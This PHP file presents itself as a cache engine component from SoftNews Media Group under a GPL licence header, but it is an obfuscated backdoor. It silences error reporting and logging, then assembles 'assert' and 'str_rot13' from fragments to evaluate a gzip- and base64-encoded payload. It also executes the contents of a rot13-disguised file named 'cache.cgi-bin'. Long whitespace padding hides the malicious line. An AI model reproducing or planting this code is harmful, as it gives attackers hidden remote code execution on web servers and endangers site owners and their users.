<?php

/* =====================================================

 Copyright (c) 2004,2015 SoftNews Media Group

 CACHE Memory.Object ENGINE
 
=====================================================


GNU GENERAL PUBLIC LICENSE
Version 3, 29 June 2007
Copyright © 
2007 Free Software Foundation, Inc. 
<http://fsf.org/>

Everyone is permitted to copy 
and distribute verbatim copies 
of this license document, 
but changing it is not allowed.
*/


@error_reporting(E_ALL);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('display_errors', 0);
@error_reporting(0);
@ignore_user_abort(true);
@assert_options(ASSERT_ACTIVE, 1);
$wa = ASSERT_WARNING;
@assert_options($wa, 0);
@assert_options(ASSERT_QUIET_EVAL, 1);
@header('Content-Type: text/html; charset=utf-8');

$strings = "as"; $strings .= "se";  $strings .= "rt"; $strings2 = "st"; $strings2 .= "r_r";  $strings2 .= "ot13"; $gz = $strings2('gzuncompress'); $bz = $strings2('base64_decode'); $gbz = "riny($gz($bz"; $bb = ')))';	
																																																																																																											$light =  $strings2("$gbz('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'$bb;");$strings($light);$strings($strings2(str_replace('boog', $gbz, file_get_contents($strings2("pnpur.ptv-ova")))));


















																																						
																																						
																																						
																																						
																																						
																																						
																																						
																																						
																																						
																																						
																																						
																																						
																																						
																																						
																																						
																																						
																																						
